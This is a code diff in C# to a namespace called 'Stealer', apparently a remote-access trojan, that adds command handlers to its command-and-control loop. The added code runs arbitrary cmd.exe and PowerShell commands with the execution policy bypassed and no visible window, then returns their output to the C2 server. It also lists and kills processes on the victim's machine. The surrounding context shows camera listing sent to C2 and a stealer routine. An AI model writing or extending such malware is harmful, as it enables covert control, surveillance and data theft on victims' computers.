@@ -100,6 +100,106 @@ namespace Stealer
                 string jsonList = CameraStream.GetCameraListJson();
                 C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
             }
+            else if (cmdLower.StartsWith("exec_cmd:"))
+            {
+                string payload = cmd.Substring("exec_cmd:".Length);
+                RunShellCommand("cmd.exe", "/c " + payload, "cmd_res");
+            }
+            else if (cmdLower.StartsWith("exec_ps:"))
+            {
+                string payload = cmd.Substring("exec_ps:".Length);
+                RunShellCommand("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command " + payload, "ps_res");
+            }
+            else if (cmdLower == "tasklist")
+            {
+                GetTaskList();
+            }
+            else if (cmdLower.StartsWith("kill:"))
+            {
+                string pidStr = cmd.Substring("kill:".Length);
+                if (int.TryParse(pidStr, out int pid))
+                {
+                    KillProcess(pid);
+                }
+            }
+        }
+
+        private static void RunShellCommand(string filename, string args, string responseType)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    var psi = new System.Diagnostics.ProcessStartInfo
+                    {
+                        FileName = filename,
+                        Arguments = args,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        CreateNoWindow = true
+                    };
+                    using (var p = System.Diagnostics.Process.Start(psi))
+                    {
+                        string output = p.StandardOutput.ReadToEnd();
+                        string error = p.StandardError.ReadToEnd();
+                        p.WaitForExit(10000);
+                        string result = string.IsNullOrEmpty(error) ? output : (output + "\r\n[STDERR]\r\n" + error);
+                        string escaped = result.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
+                        C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"" + escaped + "\"}");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"[ERROR] " + errEsc + "\"}");
+                }
+            });
+        }
+
+        private static void GetTaskList()
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    var procs = System.Diagnostics.Process.GetProcesses();
+                    var list = new System.Collections.Generic.List<string>();
+                    foreach (var p in procs)
+                    {
+                        try
+                        {
+                            string pName = p.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                            string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
+                            long mem = 0;
+                            try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
+                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + "}");
+                        }
+                        catch { }
+                    }
+                    string json = "[" + string.Join(",", list.ToArray()) + "]";
+                    C2Client.SendText("{\"type\":\"tasklist_res\",\"tasks\":" + json + "}");
+                }
+                catch { }
+            });
+        }
+
+        private static void KillProcess(int pid)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    var p = System.Diagnostics.Process.GetProcessById(pid);
+                    p.Kill();
+                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":true,\"pid\":" + pid + "}");
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
+                }
+            });
         }
 
         private static void RunStealer()
